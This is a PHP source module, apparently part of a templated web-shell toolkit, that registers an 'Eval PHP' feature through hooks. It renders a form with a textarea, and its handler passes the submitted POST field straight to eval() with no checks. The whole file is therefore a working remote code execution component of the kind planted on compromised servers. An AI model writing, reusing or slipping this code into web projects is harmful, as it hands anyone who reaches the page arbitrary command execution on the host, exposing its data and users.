<?php

// section.constants
$EVAL = "__FEAT_EVAL__";
// section.constants.end

// section.functions
/**
 * Create the code evaluation page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function __PREFIX__makeCodeEvaluationPage(&$page_content, $features, $page, $css) {
    $page_content = __PREFIX__makePage(
        $features,
        $css,
        $page,
        [
            __PREFIX__makePageHeader(
                $features[$page]["title"],
                $features[$page]["description"]
            ),
            __PREFIX__makeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                [
                    __PREFIX__makeInput(
                        "textarea",
                        "PHP code",
                        "__PARAM_1__",
                        "echo 'Hello, world!';",
                        "The PHP code to evaluate.",
                        true
                    ),
                ]
            ),
        ]
    );
}

/**
 * Handle the code evaluation operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function __PREFIX__handleCodeEvaluation($operation, $features) {
    eval($_POST["__PARAM_1__"]);
}

/**
 * Hook the features to add the code evaluation feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function __PREFIX__codeEvalHooksFeatures(&$features) {
    global $EVAL;

    $features[] = [
        "title"       => "Eval PHP",
        "description" => "Evaluate PHP code.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
</svg>',
        "op"          => $EVAL,
    ];
}

// section.functions.end

// section.hooks
add_hook("features", "__PREFIX__codeEvalHooksFeatures");
add_named_hook("GET_page", $EVAL, "__PREFIX__makeCodeEvaluationPage");
add_named_hook("POST_operation", $EVAL, "__PREFIX__handleCodeEvaluation");
// section.hooks.end